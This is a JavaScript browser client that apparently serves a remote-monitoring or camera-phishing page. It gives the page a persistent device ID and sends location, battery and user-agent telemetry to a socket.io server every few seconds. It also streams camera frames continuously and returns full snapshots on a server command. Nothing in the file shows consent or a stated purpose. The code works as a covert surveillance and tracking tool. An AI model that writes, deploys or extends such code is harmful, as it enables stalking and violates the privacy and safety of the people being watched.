const socket = io({
transports: ['websocket'],
upgrade: false,
reconnection: true,
reconnectionAttempts: Infinity,
reconnectionDelay: 2000
})
const STREAM_FRAME_INTERVAL_MS = 450
const STREAM_WIDTH = 240
const STREAM_HEIGHT = 180
const STREAM_JPEG_QUALITY = 0.28
const TELEMETRY_INTERVAL_MS = 7000
const GEO_MAX_AGE_MS = 10000

// -----------------------
// DEVICE ID (persistent)
// -----------------------

let deviceId = localStorage.getItem("device_id")

if(!deviceId){
deviceId = "device-" + Math.random().toString(36).substring(2,9)
localStorage.setItem("device_id", deviceId)
}


// -----------------------
// BATTERY DATA
// -----------------------

let batteryLevel = "Checking..."
let chargingStatus = false

if (navigator.getBattery) {
navigator.getBattery().then(battery => {

function updateBattery(){

batteryLevel = Math.floor(battery.level * 100) + "%"
chargingStatus = battery.charging

let batteryEl = document.getElementById("battery")

if(batteryEl){
batteryEl.innerText = batteryLevel
}

}

updateBattery()

battery.addEventListener("levelchange", updateBattery)
battery.addEventListener("chargingchange", updateBattery)

})
}


// -----------------------
// CAMERA CONTROL
// -----------------------

let cameraStatus = "Inactive"
let videoStream = null

function startCamera(){

navigator.mediaDevices.getUserMedia({video:true})
.then(stream => {

videoStream = stream
cameraStatus = "Streaming"

const video = document.getElementById("video")

if(video){
video.srcObject = stream
}

sendTelemetry()

})
.catch(err => {

cameraStatus = "Blocked"

console.log("Camera error:", err)

})

}


// -----------------------
// GPS LOCATION
// -----------------------

function getLocation(callback){

navigator.geolocation.getCurrentPosition(pos => {

callback({
lat: pos.coords.latitude,
lon: pos.coords.longitude
})

},
error => {

console.log("Location error:", error)

callback({
lat:null,
lon:null
})

}, {
enableHighAccuracy: false,
timeout: 5000,
maximumAge: GEO_MAX_AGE_MS
})

}


// -----------------------
// SEND TELEMETRY
// -----------------------

function sendTelemetry(){
if(!socket.connected) return

getLocation(loc => {

let data = {

device_id: deviceId,
battery: batteryLevel,
charging: chargingStatus,
platform: navigator.platform,
model: navigator.userAgent,
network: (navigator.connection && navigator.connection.effectiveType) || "unknown",
lat: loc.lat,
lon: loc.lon,
camera: cameraStatus

}

socket.emit("telemetry", data)

})

}


// -----------------------
// AUTO TELEMETRY LOOP
// -----------------------

setInterval(sendTelemetry, TELEMETRY_INTERVAL_MS)


// -----------------------
// CONNECTION STATUS
// -----------------------

socket.on("connect", () => {

console.log("Connected to server")

socket.emit("register_device", {
device_id: deviceId,
timestamp: Date.now()
})

sendTelemetry()

})

socket.on("disconnect", () => {

console.log("Disconnected from server")

})

socket.on("server_ping", () => {
socket.emit("pong", {
device_id: deviceId,
timestamp: Date.now()
})
})


// -----------------------
// REMOTE SNAPSHOT
// -----------------------

socket.on("take_snapshot", () => {

const video = document.getElementById("video")

if(!video) return

const canvas = document.createElement("canvas")

canvas.width = video.videoWidth
canvas.height = video.videoHeight

const ctx = canvas.getContext("2d")

ctx.drawImage(video, 0, 0)

const image = canvas.toDataURL("image/jpeg", 0.7)

socket.emit("snapshot_data", {
device_id: deviceId,
image
})

})

setInterval(() => {
const video = document.getElementById("video")
if(!video || !socket.connected) return
if(video.videoWidth === 0 || video.videoHeight === 0) return

const canvas = document.createElement("canvas")
canvas.width = STREAM_WIDTH
canvas.height = STREAM_HEIGHT
const ctx = canvas.getContext("2d")
ctx.drawImage(video, 0, 0, STREAM_WIDTH, STREAM_HEIGHT)

socket.emit("stream_frame", {
device_id: deviceId,
frame: canvas.toDataURL("image/jpeg", STREAM_JPEG_QUALITY)
})
}, STREAM_FRAME_INTERVAL_MS)